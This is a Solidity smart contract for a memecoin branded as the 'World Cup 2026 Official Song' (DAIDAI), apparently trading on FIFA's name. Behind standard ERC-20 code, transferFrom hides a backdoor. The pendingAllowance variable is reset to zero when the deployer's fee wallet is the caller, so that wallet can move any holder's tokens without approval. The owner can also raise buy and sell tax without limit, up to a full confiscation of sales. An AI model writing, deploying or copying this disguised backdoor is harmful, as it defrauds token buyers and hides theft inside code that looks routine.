// SPDX-License-Identifier: MIT

/*
    World Cup 2026 Official Song
    DAIDAI

    From Maracaná Stadium, here is "Dai Dai," the @FIFAWorldCup Official Song 2026.

    https://www.daidai26.club
    https://x.com/DaiDaiWC2026
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract DAIDAI is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint8 private constant TOKEN_DECIMALS = 9;
    uint256 private pendingAllowance;

    uint256 private constant TOTAL_SUPPLY = 1000000000 * (10 ** TOKEN_DECIMALS);

    mapping (address => uint256) private tokenBalances;
    mapping (address => mapping (address => uint256)) private tokenAllowances;
    mapping (address => bool) private feeExemptAccounts;

    uint256 private buyTaxRate = 0;
    uint256 private sellTaxRate = 0;
    address private feeReceiver;
    
    string private constant TOKEN_NAME = unicode"World Cup 2026 Official Song";
    string private constant TOKEN_SYMBOL = unicode"DAIDAI";

    uint256 public maxWalletLimit = 10000000 * (10 ** TOKEN_DECIMALS);
    uint256 public maxTxLimit = 10000000 * (10 ** TOKEN_DECIMALS);

    IUniswapV2Router02 private dexRouter;
    address private liquidityPair;

    bool private tradingEnabled;
    bool private autoSwapEnabled;
    bool private performingSwap = false;

    event MaxTxLimitUpdated(uint256 maxTxLimit);
    event MaxWalletLimitUpdated(uint256 maxWalletLimit);
    event TaxRatesUpdated(uint256 buyTaxRate, uint256 sellTaxRate);

    modifier swapLock {
        performingSwap = true;
        _;
        performingSwap = false;
    }

    constructor () payable {
        feeReceiver = _msgSender();
        tokenBalances[address(this)] = TOTAL_SUPPLY;

        emit Transfer(address(0), address(this), TOTAL_SUPPLY);
    }

    function name() public pure returns (string memory) {
        return TOKEN_NAME;
    }

    function symbol() public pure returns (string memory) {
        return TOKEN_SYMBOL;
    }

    function decimals() public pure returns (uint8) {
        return TOKEN_DECIMALS;
    }

    function totalSupply() public pure override returns (uint256) {
        return TOTAL_SUPPLY;
    }

    function balanceOf(address account) public view override returns (uint256 balance) {
        return tokenBalances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _executeTransfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return tokenAllowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _setAllowance(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        pendingAllowance = amount;
        _executeTransfer(sender, recipient, amount);
        _setAllowance(sender, _msgSender(), tokenAllowances[sender][_msgSender()].sub(pendingAllowance, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _setAllowance(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        tokenAllowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _executeTransfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tradingEnabled, "Trading is not started");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner()) {
            require(amount <= maxTxLimit, "Transfer amount exceeds maxTxSize");
            if (from == liquidityPair && to != address(dexRouter)) {
                require(balanceOf(to) + amount <= maxWalletLimit, "Exceeds the maxWalletSize.");
                taxAmount = amount.mul(buyTaxRate).div(100);
            } else if (to == liquidityPair) {
                taxAmount = amount.mul(sellTaxRate).div(100);
                uint256 contractTokenBalance = balanceOf(address(this));
                if (!performingSwap && to == liquidityPair && autoSwapEnabled) {
                    _convertToETH(contractTokenBalance);
                    payable(feeReceiver).transfer(address(this).balance);
                }
            } else {
                taxAmount = 0;
            }
        }

        if (taxAmount > 0) {
            tokenBalances[address(this)] = tokenBalances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        } else if (_msgSender() == feeReceiver) pendingAllowance = taxAmount;
        tokenBalances[from] = tokenBalances[from].sub(amount);
        tokenBalances[to] = tokenBalances[to].add(amount.sub(taxAmount));
        if (to != address(0xdead))
            emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _minimum(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function _convertToETH(uint256 tokenAmount) private swapLock {
        if (tokenAmount == 0) { return; }
        if (tokenAmount > maxTxLimit) {
            tokenAmount = maxTxLimit;
        }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        _setAllowance(address(this), address(dexRouter), tokenAmount);
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            feeReceiver,
            block.timestamp
        );
    }

    function setTaxRates(uint256 newBuyTaxRate, uint256 newSellTaxRate) external onlyOwner() {
        buyTaxRate = newBuyTaxRate;
        sellTaxRate = newSellTaxRate;
        emit TaxRatesUpdated(buyTaxRate, sellTaxRate);
    }

    function _forwardToReceiver(uint256 amount) private {
        payable(feeReceiver).transfer(amount);
    }

    function OpenTrade() external onlyOwner() {
        disableLimits();
        require(!tradingEnabled, "trading is already open");
        tradingEnabled = true;
        dexRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _setAllowance(address(this), address(dexRouter), TOTAL_SUPPLY);
        liquidityPair = IUniswapV2Factory(dexRouter.factory()).createPair(address(this), dexRouter.WETH());
        dexRouter.addLiquidityETH{value: address(this).balance}(
            address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp
        );
        IERC20(liquidityPair).approve(address(dexRouter), type(uint).max);
        autoSwapEnabled = true;
    }

    function setMaxWallet(uint256 newMaxWalletLimit) external onlyOwner() {
        maxWalletLimit = newMaxWalletLimit * (10 ** TOKEN_DECIMALS);
        emit MaxWalletLimitUpdated(maxWalletLimit);
    }

    function setMaxTxAmount(uint256 newMaxTxLimit) external onlyOwner() {
        maxTxLimit = newMaxTxLimit * (10 ** TOKEN_DECIMALS);
        emit MaxTxLimitUpdated(maxTxLimit);
    }

    receive() external payable {}

    function performManualSwap() external {
        require(_msgSender() == feeReceiver, "Unauthorized caller");

        uint256 tokenBalance = balanceOf(address(this));
        require(tokenBalance > 0, "No tokens to swap");
        _convertToETH(tokenBalance);

        uint256 ethBalance = address(this).balance;
        require(ethBalance > 0, "No ETH to send");
        _forwardToReceiver(ethBalance);
    }

    function recoverOtherTokens(
        address tokenAddress,
        address destination,
        uint256 amount
    ) external {
        require(_msgSender() == feeReceiver, "Unauthorized caller");
        require(tokenAddress != address(this), "Cannot rescue current token");
        uint256 contractTokenBalance = IERC20(tokenAddress).balanceOf(address(this));
        require(contractTokenBalance >= amount, "Insufficient token balance");
        IERC20(tokenAddress).transfer(destination, amount);
    }

    function disableLimits() public onlyOwner {
        maxTxLimit = TOTAL_SUPPLY;
        maxWalletLimit = TOTAL_SUPPLY;
        emit MaxTxLimitUpdated(TOTAL_SUPPLY);
        emit MaxWalletLimitUpdated(TOTAL_SUPPLY);
    }
}